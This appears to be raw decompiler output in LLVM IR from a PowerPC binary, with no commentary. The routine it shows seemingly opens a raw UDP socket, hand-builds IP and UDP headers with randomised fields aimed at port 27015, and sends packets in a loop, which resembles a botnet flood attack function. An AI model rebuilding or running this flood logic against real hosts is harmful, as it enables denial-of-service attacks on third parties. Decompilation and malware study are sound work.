  %v5_100045f4 = call i32 @function_100021c0(i32 %v0_100045f0, i32* %v4_100045f4, i32 4, i32 64)
  %v0_100045f8 = load i32, i32* @r28, align 4
  store i32 5, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_10004604 = urem i32 %v5_100045f4, 256
  store i32 %v1_10004604, i32* %r26.global-to-local, align 4
  %v0_10004608 = load i32, i32* @r29, align 4
  store i32 %v0_10004608, i32* %r3.global-to-local, align 4
  store i32 268453392, i32* @lr, align 4
  %v4_1000460c = inttoptr i32 %v0_100045f8 to i32*
  %v5_1000460c = call i32 @function_100021c0(i32 %v0_10004608, i32* %v4_1000460c, i32 5, i32 0)
  store i32 65535, i32* %r6.global-to-local, align 4
  store i32 6, i32* %r5.global-to-local, align 4
  %v0_1000461c = load i32, i32* @r28, align 4
  %v1_10004620 = urem i32 %v5_1000460c, 256
  store i32 %v1_10004620, i32* @r31, align 4
  %v0_10004624 = load i32, i32* @r29, align 4
  store i32 %v0_10004624, i32* %r3.global-to-local, align 4
  store i32 268453420, i32* @lr, align 4
  %v4_10004628 = inttoptr i32 %v0_1000461c to i32*
  %v5_10004628 = call i32 @function_100021c0(i32 %v0_10004624, i32* %v4_10004628, i32 6, i32 65535)
  store i32 7, i32* %r5.global-to-local, align 4
  store i32 27015, i32* %r6.global-to-local, align 4
  %v0_10004634 = load i32, i32* @r28, align 4
  store i32 %v5_10004628, i32* %r22.global-to-local, align 4
  %v0_1000463c = load i32, i32* @r29, align 4
  store i32 %v0_1000463c, i32* %r3.global-to-local, align 4
  store i32 268453444, i32* @lr, align 4
  %v4_10004640 = inttoptr i32 %v0_10004634 to i32*
  %v5_10004640 = call i32 @function_100021c0(i32 %v0_1000463c, i32* %v4_10004640, i32 7, i32 27015)
  store i32 %v5_10004640, i32* %r29.global-to-local, align 4
  store i32 29, i32* %r3.global-to-local, align 4
  store i32 268453456, i32* @lr, align 4
  %v1_1000464c = call i32 @function_10006c64(i32 29)
  store i32 29, i32* %r3.global-to-local, align 4
  %v3_10004658 = call i32 @function_10006bb0(i32 29, i32* nonnull %stack_var_-84)
  store i32 %v3_10004658, i32* %r30.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268453488, i32* @lr, align 4
  %v3_1000466c = call i32 @function_10008b34(i32 2, i32 3, i32 17)
  store i32 %v3_1000466c, i32* %r3.global-to-local, align 4
  %v3_10004670 = icmp eq i32 %v3_1000466c, -1
  store i32 %v3_1000466c, i32* %r25.global-to-local, align 4
  br i1 %v3_10004670, label %dec_label_pc_100048c0, label %dec_label_pc_1000467c

dec_label_pc_1000467c:                            ; preds = %dec_label_pc_1000453c
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r5.global-to-local, align 4
  %v2_10004688 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10004688, i32* %r6.global-to-local, align 4
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-88, align 4
  store i32 268453528, i32* @lr, align 4
  %v5_10004694 = call i32 @function_10008af8(i32 0, i32 3, i32 %v2_10004688, i32 4, i32 4)
  store i32 %v5_10004694, i32* %r3.global-to-local, align 4
  %v3_10004698 = icmp eq i32 %v5_10004694, -1
  br i1 %v3_10004698, label %dec_label_pc_100048b8, label %dec_label_pc_100046a0

dec_label_pc_100046a0:                            ; preds = %dec_label_pc_1000467c
  %v0_100046a0 = load i32, i32* %r23.global-to-local, align 4
  %v1_100046a0 = icmp slt i32 %v0_100046a0, 0
  %v3_100046a0 = icmp eq i32 %v0_100046a0, 0
  store i1 %v1_100046a0, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_100046a0, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100046a8 = load i32, i32* %r21.global-to-local, align 4
  %v1_100046a8 = urem i32 %v0_100046a8, 65536
  store i32 %v1_100046a8, i32* %r20.global-to-local, align 4
  store i32 0, i32* %stack_var_-88, align 4
  %v0_100046b0 = load i32, i32* %r22.global-to-local, align 4
  %v1_100046b0 = urem i32 %v0_100046b0, 65536
  store i32 %v1_100046b0, i32* %r21.global-to-local, align 4
  %v0_100046b4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100046b4 = urem i32 %v0_100046b4, 65536
  store i32 %v1_100046b4, i32* %r22.global-to-local, align 4
  %tmp32 = icmp slt i32 %v0_100046a0, 1
  br i1 %tmp32, label %dec_label_pc_1000478c.outer, label %dec_label_pc_100046bc

dec_label_pc_100046bc:                            ; preds = %dec_label_pc_100046a0
  %v0_100046bc = load i32, i32* @r31, align 4
  %v3_100046bc = icmp eq i32 %v0_100046bc, 0
  store i1 %v3_100046bc, i1* %cr3_eq.global-to-local, align 1
  store i32 4, i32* %r29.global-to-local, align 4
  store i32 5, i32* %r28.global-to-local, align 4
  store i32 16384, i32* %r18.global-to-local, align 4
  store i32 17, i32* %r17.global-to-local, align 4
  store i32 -1, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_100046dc

dec_label_pc_100046dc:                            ; preds = %dec_label_pc_10004738, %dec_label_pc_100046bc
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 268453608, i32* @lr, align 4
  %v2_100046e4 = call i32 @function_10008ec0(i32 128, i32 1)
  store i32 %v2_100046e4, i32* %r3.global-to-local, align 4
  %v3_100046e8 = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_100046e8, i32* %r0.global-to-local, align 4
  %v0_100046ec = load i32, i32* @r31, align 4
  %v1_100046ec = mul i32 %v0_100046ec, 4
  store i32 %v1_100046ec, i32* %r9.global-to-local, align 4
  %v0_100046f0 = load i32, i32* @r30, align 4
  %v2_100046f4 = load i32, i32* %r24.global-to-local, align 4
  %v3_100046f4 = add i32 %v2_100046f4, %v1_100046ec
  %v4_100046f4 = inttoptr i32 %v3_100046f4 to i32*
  store i32 %v2_100046e4, i32* %v4_100046f4, align 4
  %v0_100046f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100046f8 = mul i32 %v0_100046f8, 4
  store i32 %v1_100046f8, i32* %r0.global-to-local, align 4
  %v0_100046fc = load i32, i32* %r24.global-to-local, align 4
  %v2_100046fc = add i32 %v0_100046fc, %v1_100046f8
  %v3_100046fc = inttoptr i32 %v2_100046fc to i32*
  %v4_100046fc = load i32, i32* %v3_100046fc, align 4
  store i32 %v4_100046fc, i32* %r10.global-to-local, align 4
  %v1_10004700 = inttoptr i32 %v4_100046fc to i32*
  %v2_10004700 = load i32, i32* %v1_10004700, align 4
  store i32 %v2_10004700, i32* %r0.global-to-local, align 4
  %v1_10004704 = add i32 %v4_100046fc, 32
  store i32 %v1_10004704, i32* %r3.global-to-local, align 4
  %v0_10004708 = load i32, i32* %r20.global-to-local, align 4
  %v1_10004708 = trunc i32 %v0_10004708 to i16
  %v3_10004708 = add i32 %v4_100046fc, 4
  %v4_10004708 = inttoptr i32 %v3_10004708 to i16*
  store i16 %v1_10004708, i16* %v4_10004708, align 2
  %v0_1000470c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000470c = add i32 %v0_1000470c, 20
  store i32 %v1_1000470c, i32* %r8.global-to-local, align 4
  %v1_10004710 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10004710, i32* %r0.global-to-local, align 4
  %v1_10004714 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10004714, i32* %r0.global-to-local, align 4
  %v1_10004718 = load i32, i32* %r10.global-to-local, align 4
  %v2_10004718 = inttoptr i32 %v1_10004718 to i32*
  store i32 %v1_10004714, i32* %v2_10004718, align 4
  %v0_1000471c = load i32, i32* %r19.global-to-local, align 4
  %v1_1000471c = trunc i32 %v0_1000471c to i8
  %v2_1000471c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000471c = add i32 %v2_1000471c, 1
  %v4_1000471c = inttoptr i32 %v3_1000471c to i8*
  store i8 %v1_1000471c, i8* %v4_1000471c, align 1
  %v3_10004720 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_10004720, i32* %r9.global-to-local, align 4
  %v0_10004724 = load i32, i32* %r26.global-to-local, align 4
  %v1_10004724 = trunc i32 %v0_10004724 to i8
  %v2_10004724 = load i32, i32* %r10.global-to-local, align 4
  %v3_10004724 = add i32 %v2_10004724, 8
  %v4_10004724 = inttoptr i32 %v3_10004724 to i8*
  store i8 %v1_10004724, i8* %v4_10004724, align 1
  %v0_10004728 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004728 = add i32 %v0_10004728, 32
  store i32 %v1_10004728, i32* %r9.global-to-local, align 4
  %v1_1000472c = trunc i32 %v1_10004728 to i16
  %v2_1000472c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000472c = add i32 %v2_1000472c, 2
  %v4_1000472c = inttoptr i32 %v3_1000472c to i16*
  store i16 %v1_1000472c, i16* %v4_1000472c, align 2
  %v0_10004730 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10004730, label %dec_label_pc_10004738, label %dec_label_pc_10004734

dec_label_pc_10004734:                            ; preds = %dec_label_pc_100046dc
  %v0_10004734 = load i32, i32* %r18.global-to-local, align 4
  %v1_10004734 = trunc i32 %v0_10004734 to i16
  %v2_10004734 = load i32, i32* %r10.global-to-local, align 4
  %v3_10004734 = add i32 %v2_10004734, 6
  %v4_10004734 = inttoptr i32 %v3_10004734 to i16*
  store i16 %v1_10004734, i16* %v4_10004734, align 2
  br label %dec_label_pc_10004738

dec_label_pc_10004738:                            ; preds = %dec_label_pc_100046dc, %dec_label_pc_10004734
  %v0_10004738 = load i32, i32* %r17.global-to-local, align 4
  %v1_10004738 = trunc i32 %v0_10004738 to i8
  %v2_10004738 = load i32, i32* %r10.global-to-local, align 4
  %v3_10004738 = add i32 %v2_10004738, 9
  %v4_10004738 = inttoptr i32 %v3_10004738 to i8*
  store i8 %v1_10004738, i8* %v4_10004738, align 1
  %v0_1000473c = load i32, i32* %r21.global-to-local, align 4
  %v1_1000473c = trunc i32 %v0_1000473c to i16
  %v2_1000473c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000473c = add i32 %v2_1000473c, 20
  %v4_1000473c = inttoptr i32 %v3_1000473c to i16*
  store i16 %v1_1000473c, i16* %v4_1000473c, align 2
  %v3_10004740 = load i32, i32* %stack_var_-88, align 4
  %v3_10004744 = load i32, i32* @global_var_1001b288.63, align 4
  store i32 %v3_10004744, i32* %r0.global-to-local, align 4
  %v1_10004748 = mul i32 %v3_10004740, 24
  store i32 %v1_10004748, i32* %r9.global-to-local, align 4
  %v0_1000474c = load i32, i32* %r22.global-to-local, align 4
  %v1_1000474c = trunc i32 %v0_1000474c to i16
  %v2_1000474c = load i32, i32* %r8.global-to-local, align 4
  %v3_1000474c = add i32 %v2_1000474c, 2
  %v4_1000474c = inttoptr i32 %v3_1000474c to i16*
  store i16 %v1_1000474c, i16* %v4_1000474c, align 2
  %v0_10004750 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004750 = load i32, i32* %r10.global-to-local, align 4
  %v2_10004750 = add i32 %v1_10004750, 12
  %v3_10004750 = inttoptr i32 %v2_10004750 to i32*
  store i32 %v0_10004750, i32* %v3_10004750, align 4
  %v0_10004754 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004754 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004754 = add i32 %v1_10004754, %v0_10004754
  store i32 %v2_10004754, i32* %r9.global-to-local, align 4
  %v1_10004758 = add i32 %v2_10004754, 16
  %v2_10004758 = inttoptr i32 %v1_10004758 to i32*
  %v3_10004758 = load i32, i32* %v2_10004758, align 4
  store i32 %v3_10004758, i32* %r0.global-to-local, align 4
  %v3_1000475c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1000475c, i32* %r11.global-to-local, align 4
  %v0_10004760 = load i32, i32* %r16.global-to-local, align 4
  %v1_10004760 = load i32, i32* %r10.global-to-local, align 4
  %v2_10004760 = add i32 %v1_10004760, 28
  %v3_10004760 = inttoptr i32 %v2_10004760 to i32*
  store i32 %v0_10004760, i32* %v3_10004760, align 4
  %v0_10004764 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004764 = load i32, i32* %r10.global-to-local, align 4
  %v2_10004764 = add i32 %v1_10004764, 16
  %v3_10004764 = inttoptr i32 %v2_10004764 to i32*
  store i32 %v0_10004764, i32* %v3_10004764, align 4
  %v0_10004768 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004768 = add i32 %v0_10004768, 12
  store i32 %v1_10004768, i32* %r11.global-to-local, align 4
  %v1_1000476c = trunc i32 %v1_10004768 to i16
  %v2_1000476c = load i32, i32* %r8.global-to-local, align 4
  %v3_1000476c = add i32 %v2_1000476c, 4
  %v4_1000476c = inttoptr i32 %v3_1000476c to i16*
  store i16 %v1_1000476c, i16* %v4_1000476c, align 2
  %v3_10004770 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_10004770, i32* %r5.global-to-local, align 4
  store i32 268453752, i32* @lr, align 4
  %v3_10004774 = call i32 @function_10007560(i32 %v3_10004770, i32 %v0_100046f0, i32 %v3_10004770)
  store i32 %v3_10004774, i32* %r3.global-to-local, align 4
  %v3_10004778 = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_10004778, i32* %r9.global-to-local, align 4
  %v1_1000477c = add i32 %v3_10004778, 1
  %v1_10004780 = load i32, i32* %r23.global-to-local, align 4
  %v2_10004780 = icmp slt i32 %v1_1000477c, %v1_10004780
  store i32 %v1_1000477c, i32* %stack_var_-88, align 4
  br i1 %v2_10004780, label %dec_label_pc_100046dc, label %dec_label_pc_1000478c.preheader.loopexit

dec_label_pc_1000478c.preheader.loopexit:         ; preds = %dec_label_pc_10004738
  %v0_1000478c.pre.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_1000478c.pre.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_1000478c.outer

dec_label_pc_1000478c.outer:                      ; preds = %dec_label_pc_10004858, %dec_label_pc_100046a0, %dec_label_pc_1000478c.preheader.loopexit
  %v1_1000478c.ph34 = phi i1 [ %v1_100046a0, %dec_label_pc_100046a0 ], [ %v1_1000478c.pre.pre, %dec_label_pc_1000478c.preheader.loopexit ], [ %v1_10004858, %dec_label_pc_10004858 ]
  %v0_1000478c.ph35 = phi i1 [ %v3_100046a0, %dec_label_pc_100046a0 ], [ %v0_1000478c.pre.pre, %dec_label_pc_1000478c.preheader.loopexit ], [ %v0_10004858, %dec_label_pc_10004858 ]
  %v2_1000478c = or i1 %v1_1000478c.ph34, %v0_1000478c.ph35
  br label %dec_label_pc_1000478c

dec_label_pc_1000478c:                            ; preds = %dec_label_pc_1000478c.outer, %dec_label_pc_1000478c
  br i1 %v2_1000478c, label %dec_label_pc_1000478c, label %dec_label_pc_10004790

dec_label_pc_10004790:                            ; preds = %dec_label_pc_1000478c, %dec_label_pc_10004858
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 0, i32* %stack_var_-88, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_100047a0

dec_label_pc_100047a0:                            ; preds = %dec_label_pc_100047e0, %dec_label_pc_10004790
  %v0_100047b0 = phi i32 [ %v1_10004848, %dec_label_pc_100047e0 ], [ 0, %dec_label_pc_10004790 ]
  %v1_100047a0 = mul i32 %v0_100047b0, 24
  store i32 65535, i32* %r30.global-to-local, align 4
  %v1_100047ac = load i32, i32* %r27.global-to-local, align 4
  %v2_100047ac = add i32 %v1_100047ac, %v1_100047a0
  store i32 %v2_100047ac, i32* %r10.global-to-local, align 4
  %v1_100047b0 = mul i32 %v0_100047b0, 4
  store i32 %v1_100047b0, i32* %r0.global-to-local, align 4
  %v1_100047b4 = add i32 %v2_100047ac, 20
  %v2_100047b4 = inttoptr i32 %v1_100047b4 to i8*
  %v3_100047b4 = load i8, i8* %v2_100047b4, align 1
  %v4_100047b4 = zext i8 %v3_100047b4 to i32
  store i32 %v4_100047b4, i32* %r9.global-to-local, align 4
  %v0_100047b8 = load i32, i32* %r24.global-to-local, align 4
  %v2_100047b8 = add i32 %v0_100047b8, %v1_100047b0
  %v3_100047b8 = inttoptr i32 %v2_100047b8 to i32*
  %v4_100047b8 = load i32, i32* %v3_100047b8, align 4
  store i32 %v4_100047b8, i32* %r28.global-to-local, align 4
  %v1_100047c0 = add i32 %v4_100047b8, 20
  store i32 %v1_100047c0, i32* @r31, align 4
  %tmp33 = icmp ult i8 %v3_100047b4, 32
  br i1 %tmp33, label %dec_label_pc_10004860, label %dec_label_pc_100047c8

dec_label_pc_100047c8:                            ; preds = %dec_label_pc_100047a0
  %v0_100047c8 = load i32, i32* %r20.global-to-local, align 4
  %v4_100047c8 = icmp eq i32 %v0_100047c8, 65535
  br i1 %v4_100047c8, label %dec_label_pc_1000488c, label %dec_label_pc_100047d0

dec_label_pc_100047d0:                            ; preds = %dec_label_pc_10004860.dec_label_pc_100047d0_crit_edge, %dec_label_pc_100047c8
  %v1_100047d0 = phi i32 [ %v1_100047d0.pre, %dec_label_pc_10004860.dec_label_pc_100047d0_crit_edge ], [ 65535, %dec_label_pc_100047c8 ]
  %v0_100047d0 = load i32, i32* %r21.global-to-local, align 4
  %v4_100047d0 = icmp eq i32 %v0_100047d0, %v1_100047d0
  br i1 %v4_100047d0, label %dec_label_pc_1000489c, label %dec_label_pc_100047d8

dec_label_pc_100047d8:                            ; preds = %dec_label_pc_1000488c.dec_label_pc_100047d8_crit_edge, %dec_label_pc_100047d0
  %v1_100047d8 = phi i32 [ %v1_100047d8.pre, %dec_label_pc_1000488c.dec_label_pc_100047d8_crit_edge ], [ %v1_100047d0, %dec_label_pc_100047d0 ]
  %v0_100047d8 = load i32, i32* %r22.global-to-local, align 4
  %v4_100047d8 = icmp eq i32 %v0_100047d8, %v1_100047d8
  br i1 %v4_100047d8, label %dec_label_pc_100048ac, label %dec_label_pc_100047e0

dec_label_pc_100047e0:                            ; preds = %dec_label_pc_1000489c, %dec_label_pc_100047d8, %dec_label_pc_100048ac
  %v0_100047e0 = load i32, i32* %r26.global-to-local, align 4
  %v1_100047e0 = trunc i32 %v0_100047e0 to i16
  %v2_100047e0 = load i32, i32* %r28.global-to-local, align 4
  %v3_100047e0 = add i32 %v2_100047e0, 10
  %v4_100047e0 = inttoptr i32 %v3_100047e0 to i16*
  store i16 %v1_100047e0, i16* %v4_100047e0, align 2
  %v0_100047e8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100047e8, i32* @r3, align 4
  %v2_100047ec = call i32 @function_1000491c(i32 %v0_100047e8, i32 20)
  %v3_100047ec = trunc i32 %v2_100047ec to i16
  store i32 %v2_100047ec, i32* %r3.global-to-local, align 4
  %v3_100047f0 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_100047f0, i32* %r6.global-to-local, align 4
  %v3_100047f4 = load i32, i32* %r28.global-to-local, align 4
  %v4_100047f4 = add i32 %v3_100047f4, 10
  %v5_100047f4 = inttoptr i32 %v4_100047f4 to i16*
  store i16 %v3_100047ec, i16* %v5_100047f4, align 2
  %v0_100047f8 = load i32, i32* @r31, align 4
  store i32 %v0_100047f8, i32* @r4, align 4
  %v0_100047fc = load i32, i32* %r26.global-to-local, align 4
  %v1_100047fc = trunc i32 %v0_100047fc to i16
  %v3_100047fc = add i32 %v0_100047f8, 6
  %v4_100047fc = inttoptr i32 %v3_100047fc to i16*
  store i16 %v1_100047fc, i16* %v4_100047fc, align 2
  %v0_10004800 = load i32, i32* %r6.global-to-local, align 4
  %v1_10004800 = add i32 %v0_10004800, 12
  store i32 %v1_10004800, i32* %r6.global-to-local, align 4
  %v0_10004804 = load i32, i32* @r31, align 4
  %v1_10004804 = add i32 %v0_10004804, 4
  %v2_10004804 = inttoptr i32 %v1_10004804 to i16*
  %v3_10004804 = load i16, i16* %v2_10004804, align 2
  %v4_10004804 = zext i16 %v3_10004804 to i32
  store i32 %v4_10004804, i32* %r5.global-to-local, align 4
  %v0_10004808 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10004808, i32* %r3.global-to-local, align 4
  %v4_1000480c = call i32 @function_10004980(i32 %v0_10004808, i32 %v0_100047f8, i32 %v4_10004804, i32 %v1_10004800)
  %v5_1000480c = trunc i32 %v4_1000480c to i16
  store i32 %v4_1000480c, i32* %r3.global-to-local, align 4
  %v3_10004810 = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_10004810, i32* %r7.global-to-local, align 4
  %v0_10004814 = load i32, i32* @r31, align 4
  %v1_10004814 = add i32 %v0_10004814, 2
  %v2_10004814 = inttoptr i32 %v1_10004814 to i16*
  %v3_10004814 = load i16, i16* %v2_10004814, align 2
  %v4_10004814 = zext i16 %v3_10004814 to i32
  store i32 %v4_10004814, i32* %r0.global-to-local, align 4
  %v0_10004818 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000481c = mul i32 %v3_10004810, 24
  store i32 %v1_1000481c, i32* %r7.global-to-local, align 4
  %v3_10004820 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_10004820, i32* %r5.global-to-local, align 4
  %v4_10004824 = add i32 %v0_10004814, 6
  %v5_10004824 = inttoptr i32 %v4_10004824 to i16*
  store i16 %v5_1000480c, i16* %v5_10004824, align 2
  store i32 16384, i32* %r6.global-to-local, align 4
  %v0_1000482c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000482c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000482c = add i32 %v1_1000482c, %v0_1000482c
  store i32 %v2_1000482c, i32* %r7.global-to-local, align 4
  %v0_10004830 = load i32, i32* %r5.global-to-local, align 4
  %v1_10004830 = add i32 %v0_10004830, 32
  store i32 %v1_10004830, i32* %r5.global-to-local, align 4
  %v0_10004834 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004834 = trunc i32 %v0_10004834 to i16
  %v3_10004834 = add i32 %v2_1000482c, 2
  %v4_10004834 = inttoptr i32 %v3_10004834 to i16*
  store i16 %v1_10004834, i16* %v4_10004834, align 2
  %v0_10004838 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10004838, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 268453956, i32* @lr, align 4
  %v6_10004840 = call i32 @function_10008ab8(i32 %v0_10004838, i32 %v0_10004818, i32 %v1_10004830, i32 16384, i32 %v2_1000482c, i32 16)
  store i32 %v6_10004840, i32* %r3.global-to-local, align 4
  %v3_10004844 = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_10004844, i32* %r9.global-to-local, align 4
  %v1_10004848 = add i32 %v3_10004844, 1
  store i32 %v1_10004848, i32* %r11.global-to-local, align 4
  %v1_1000484c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000484c = icmp slt i32 %v1_10004848, %v1_1000484c
  store i32 %v1_10004848, i32* %stack_var_-88, align 4
  br i1 %v2_1000484c, label %dec_label_pc_100047a0, label %dec_label_pc_10004858

dec_label_pc_10004858:                            ; preds = %dec_label_pc_100047e0
  %v0_10004858 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10004858 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10004858 = or i1 %v0_10004858, %v1_10004858
  br i1 %v2_10004858, label %dec_label_pc_1000478c.outer, label %dec_label_pc_10004790

dec_label_pc_10004860:                            ; preds = %dec_label_pc_100047a0
  %v1_10004860 = add i32 %v2_100047ac, 16
  %v2_10004860 = inttoptr i32 %v1_10004860 to i32*
  %v3_10004860 = load i32, i32* %v2_10004860, align 4
  store i32 %v3_10004860, i32* %r29.global-to-local, align 4
  %v0_10004864 = call i32 @function_10006318()
  store i32 %v0_10004864, i32* %r3.global-to-local, align 4
  %v3_10004868 = load i32, i32* %stack_var_-88, align 4
  %v0_1000486c = load i32, i32* %r20.global-to-local, align 4
  %v1_1000486c = load i32, i32* %r30.global-to-local, align 4
  %v4_1000486c = icmp eq i32 %v0_1000486c, %v1_1000486c
  %v1_10004870 = mul i32 %v3_10004868, 24
  %v1_10004874 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004874 = add i32 %v1_10004874, %v1_10004870
  store i32 %v2_10004874, i32* %r9.global-to-local, align 4
  %v1_10004878 = add i32 %v2_10004874, 20
  %v2_10004878 = inttoptr i32 %v1_10004878 to i8*
  %v3_10004878 = load i8, i8* %v2_10004878, align 1
  %v4_10004878 = zext i8 %v3_10004878 to i32
  store i32 %v4_10004878, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10004878, 64
  %v2_1000487c = zext i8 %tmp to i32
  %v3_1000487c = lshr i32 %v0_10004864, %v2_1000487c
  store i32 %v3_1000487c, i32* %r3.global-to-local, align 4
  %v0_10004880 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004880 = add i32 %v3_1000487c, %v0_10004880
  store i32 %v2_10004880, i32* %r29.global-to-local, align 4
  %v1_10004884 = load i32, i32* %r28.global-to-local, align 4
  %v2_10004884 = add i32 %v1_10004884, 16
  %v3_10004884 = inttoptr i32 %v2_10004884 to i32*
  store i32 %v2_10004880, i32* %v3_10004884, align 4
  br i1 %v4_1000486c, label %dec_label_pc_1000488c, label %dec_label_pc_10004860.dec_label_pc_100047d0_crit_edge

dec_label_pc_10004860.dec_label_pc_100047d0_crit_edge: ; preds = %dec_label_pc_10004860
  %v1_100047d0.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100047d0

dec_label_pc_1000488c:                            ; preds = %dec_label_pc_10004860, %dec_label_pc_100047c8
  %v0_1000488c = call i32 @function_10006318()
  %v1_1000488c = trunc i32 %v0_1000488c to i16
  store i32 %v0_1000488c, i32* %r3.global-to-local, align 4
  %v0_10004890 = load i32, i32* %r21.global-to-local, align 4
  %v1_10004890 = load i32, i32* %r30.global-to-local, align 4
  %v4_10004890 = icmp eq i32 %v0_10004890, %v1_10004890
  %v3_10004894 = load i32, i32* %r28.global-to-local, align 4
  %v4_10004894 = add i32 %v3_10004894, 4
  %v5_10004894 = inttoptr i32 %v4_10004894 to i16*
  store i16 %v1_1000488c, i16* %v5_10004894, align 2
  br i1 %v4_10004890, label %dec_label_pc_1000489c, label %dec_label_pc_1000488c.dec_label_pc_100047d8_crit_edge

dec_label_pc_1000488c.dec_label_pc_100047d8_crit_edge: ; preds = %dec_label_pc_1000488c
  %v1_100047d8.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100047d8

dec_label_pc_1000489c:                            ; preds = %dec_label_pc_1000488c, %dec_label_pc_100047d0
  %v0_1000489c = call i32 @function_10006318()
  %v1_1000489c = trunc i32 %v0_1000489c to i16
  store i32 %v0_1000489c, i32* %r3.global-to-local, align 4
  %v0_100048a0 = load i32, i32* %r22.global-to-local, align 4
  %v1_100048a0 = load i32, i32* %r30.global-to-local, align 4
  %v4_100048a0 = icmp eq i32 %v0_100048a0, %v1_100048a0
  %v3_100048a4 = load i32, i32* %r28.global-to-local, align 4
  %v4_100048a4 = add i32 %v3_100048a4, 20
  %v5_100048a4 = inttoptr i32 %v4_100048a4 to i16*
  store i16 %v1_1000489c, i16* %v5_100048a4, align 2
  br i1 %v4_100048a0, label %dec_label_pc_100048ac, label %dec_label_pc_100047e0

dec_label_pc_100048ac:                            ; preds = %dec_label_pc_1000489c, %dec_label_pc_100047d8
  %v0_100048ac = call i32 @function_10006318()
  %v1_100048ac = trunc i32 %v0_100048ac to i16
  store i32 %v0_100048ac, i32* %r3.global-to-local, align 4
  %v3_100048b0 = load i32, i32* @r31, align 4
  %v4_100048b0 = add i32 %v3_100048b0, 2
  %v5_100048b0 = inttoptr i32 %v4_100048b0 to i16*
  store i16 %v1_100048ac, i16* %v5_100048b0, align 2
  br label %dec_label_pc_100047e0

dec_label_pc_100048b8:                            ; preds = %dec_label_pc_1000467c
  %v0_100048b8 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100048b8, i32* %r3.global-to-local, align 4
  store i32 268454080, i32* @lr, align 4
  %v0_100048bc = call i32 @function_10007d68()
  store i32 %v0_100048bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100048c0

dec_label_pc_100048c0:                            ; preds = %dec_label_pc_1000453c, %dec_label_pc_100048b8
  store i32 %v0_10004540, i32* %r0.global-to-local, align 4
  %v1_100048d4 = call %0 @__asm_mtcrf(i32 24, i32 %v0_10004544)
  store i32 %v0_1000457c, i32* %r28.global-to-local, align 4
  store i32 %v0_10004584, i32* %r29.global-to-local, align 4
  store i32 %v0_1000458c, i32* %r30.global-to-local, align 4
  %v0_10004918 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10004918

; uselistorder directives
  uselistorder i32 %v0_100048ac, { 1, 0 }
  uselistorder i32 %v0_1000489c, { 1, 0 }
  uselistorder i32 %v0_1000488c, { 1, 0 }
  uselistorder i1 %v1_10004858, { 1, 0 }
  uselistorder i1 %v0_10004858, { 1, 0 }
  uselistorder i32 %v1_10004848, { 0, 2, 3, 1 }
  uselistorder i32 %v4_1000480c, { 1, 0 }
  uselistorder i32 %v2_100047ec, { 1, 0 }
  uselistorder i32 %v1_100047b0, { 1, 0 }
  uselistorder i32 %v1_100046f8, { 1, 0 }
  uselistorder i32 %v1_100046ec, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 0 }
